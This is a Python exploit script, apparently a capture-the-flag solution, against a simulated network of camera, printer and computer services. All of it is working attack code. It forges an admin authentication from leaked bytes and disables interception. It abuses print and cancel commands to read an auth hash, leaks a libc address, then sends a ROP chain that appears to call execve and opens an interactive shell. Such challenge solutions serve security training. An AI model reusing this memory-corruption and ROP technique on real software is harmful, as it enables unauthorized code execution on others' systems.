import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)
    
# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

# Send packet
def sendPacket(src, dst, body, length=None):
    p.readuntil("======================================")
    p.readuntil("======================================")
    p.sendline(1)
    p.readuntil('Source:')
    p.sendline(src)
    p.readuntil('Destination:')
    p.sendline(dst)
    p.readuntil('Length:')
    p.sendline(str(length if length != None else len(body) + 1))
    p.readuntil('Payload:')
    p.send(body)

# Authenticate Camera
data = p.readuntil('Quit')
p.sendline('2')
payload = 'authCamAdmin\x00'+'\xff'*16
data = p.readuntil('======================================')
data = p.readuntil('======================================')
data = p.readuntil('======================================')
p.sendline('1')
data = p.readuntil('Packet Source:')
p.sendline(1)
data = p.readuntil('Packet Destination:')
p.sendline(0)
data = p.readuntil('Payload Length:')
p.sendline(len(payload)+4)
data = p.readuntil('Packet Payload:')
p.sendline(payload)
data = p.readuntil('Route Packet')
p.sendline('4')
data = p.readuntil('0F')
data = p.readuntil('---\n')
data = p.readuntil('00')

d = p.readuntil('Route Packet')
p.sendline('4')

d = p.readuntil('Route Packet')
p.sendline('3')
p.sendline('authCamAdmin\x00'+ \
    chr(~int(data[:2],16)&255) + \
    chr(~int(data[3:5],16)&255) + \
    chr(~int(data[6:8],16)&255) + \
    chr(~int(data[9:11],16)&255) + \
    '\xff'*12)

data = p.readuntil('Route Packet')
p.sendline('4')

# Disable interception
data = p.readuntil('Route Packet')
p.sendline('2')
p.sendline('4')
p.sendline('3')
data = p.readuntil('DISABLED')


# Move camera toward printer
sendPacket(3, 0, 'direction\x03')

# Print empty documents
for i in range(2):
    sendPacket(3, 1, 'rprint' + p64(0) + '\xff\x00\x00\x00' + 0 * 'a')

# Cancel print job
sendPacket(3, 2, '\x03\xb9\x00\x00'+'\x44\x43\x42\x41')

# Call attach document
sendPacket(3, 2, '\x04\xb9\x00\x00'+'\x44\x43\x42\x41'+'\x20\x00\x00\x00'+'a'*16)

# Read printed document with camera
sendPacket(3, 0, 'watch')
print p.readuntil('aaaaaaaaaaaaaaaa')
auth_hash = p.readuntil('\n').strip()

# Set on_exit
sendPacket(3, 1, 'rctrl' + auth_hash + '\x02\x00\x00\x00' + "exit")

# Enable interception
p.readuntil("======================================")
p.readuntil("======================================")
p.sendline(2)

# Leak pointers with email
sendPacket(3, 1, 'rctrl' + auth_hash + '\x04\x00\x00\x00' + '\x04\x00\x00\x00' + '\x01\x00\x00\x00')
print p.readuntil('Packet\n')
p.sendline(4)
p.readuntil("-----------------------------------------------")
p.readuntil("-----------------------------------------------")
data = p.readuntil("-----------------------------------------------").strip('-')
p.readuntil('Packet')    
p.sendline(4)

# Disable interception
p.readuntil("======================================")
p.readuntil("======================================")
p.sendline(3)

#finding libc base address
libc_exit_addr = int(''.join(data.strip()[:18].split(' ')[::-1]).strip(), 16)
libc_addr = libc_exit_addr - 0x3a030

# Leak pointers from computer
sendPacket(3, 1, 'rctrl'+auth_hash+'\x03\x00\x00\x00'+'\x04\x00\x00\x00'+p64(libc_addr+0x101f3b))

# ROP Chain
gadgets = [
    libc_addr + 0x33544, 0x3b,
    libc_addr + 0xe8c0e,
    libc_addr + 0x1b92, 0x0,
    libc_addr + 0x21102,
    libc_addr + 0x18cd57,
    libc_addr + 0xbc375
]
sendPacket(3, 1, 'rctrl' + auth_hash + '\x05\x00\x00\x00' + 'a' * 8 + ''.join(p64(x) for x in gadgets))

p.interactive()